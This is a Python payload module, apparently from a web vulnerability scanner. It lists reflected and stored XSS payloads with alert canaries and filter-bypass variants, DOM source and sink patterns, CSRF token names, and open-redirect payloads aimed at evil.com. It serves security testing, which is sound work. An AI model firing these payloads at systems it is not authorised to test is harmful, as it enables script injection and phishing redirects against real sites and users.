"""
payloads.py — Payloads para XSSAndClient.
Reflected XSS, Stored XSS probe, DOM XSS heuristics, CSRF, Open Redirect.
"""

# ── XSS Payloads ──────────────────────────────────────────────────────────────

# Canary único para detectar reflexão
XSS_CANARY = "bugxss9182736"

XSS_REFLECTED = [
    f'<script>alert("{XSS_CANARY}")</script>',
    f'"><script>alert("{XSS_CANARY}")</script>',
    f"'><script>alert('{XSS_CANARY}')</script>",
    f'<img src=x onerror=alert("{XSS_CANARY}")>',
    f'"><img src=x onerror=alert("{XSS_CANARY}")>',
    f'<svg/onload=alert("{XSS_CANARY}")>',
    f'"><svg/onload=alert("{XSS_CANARY}")>',
    f'javascript:alert("{XSS_CANARY}")',
    f'<body onload=alert("{XSS_CANARY}")>',
    f'<<script>alert("{XSS_CANARY}")//<</script>',
    f'<script>alert(String.fromCharCode(88,83,83))</script>',
    f'%3cscript%3ealert%28%22{XSS_CANARY}%22%29%3c%2fscript%3e',
    # HTML entity bypass
    f'&lt;script&gt;alert("{XSS_CANARY}")&lt;/script&gt;',
    # Event handlers
    f'" onmouseover="alert(\'{XSS_CANARY}\')"',
    f"' onmouseover='alert(`{XSS_CANARY}`)'",
]

# Payloads que sobrevivem a encodings comuns
XSS_STORED_PROBE = [
    f'<img src=1 onerror=alert("{XSS_CANARY}")>',
    f'"><details open ontoggle=alert("{XSS_CANARY}")>',
    f'<iframe srcdoc="<script>alert({XSS_CANARY})</script>">',
    f'<math><mtext></p><script>alert("{XSS_CANARY}")</script>',
]

# Padrões DOM source → sink (heurístico, sem execução JS)
DOM_SOURCES = [
    "location.href", "location.search", "location.hash",
    "document.URL", "document.referrer",
    "window.name", "document.cookie",
    "document.title", "document.baseURI",
    "location.pathname",
]

DOM_SINKS = [
    "document.write(", "document.writeln(",
    "innerHTML", "outerHTML",
    "eval(", "setTimeout(", "setInterval(",
    "Function(", "execScript(",
    "location =", "location.href =", "location.replace(",
    "document.domain =",
    "jQuery(", "$(", ".html(",
    "insertAdjacentHTML(",
]

# ── CSRF ──────────────────────────────────────────────────────────────────────

CSRF_TOKEN_NAMES = [
    "csrf", "csrf_token", "_token", "csrfmiddlewaretoken",
    "authenticity_token", "_csrf", "xsrf", "xsrf-token",
    "__requestverificationtoken", "nonce",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "redirecturl",
    "return", "returnurl", "return_to", "returnto",
    "next", "next_url", "nexturl",
    "url", "goto", "go", "target", "dest", "destination",
    "forward", "forwardurl", "forward_url",
    "continue", "site", "link",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F@legitimate.com",
    "/\\evil.com",
    "https:evil.com",
    "%2f%2fevil.com",
    "///evil.com",
    "https://legitimate.com@evil.com",
    "\\/evil.com",
]
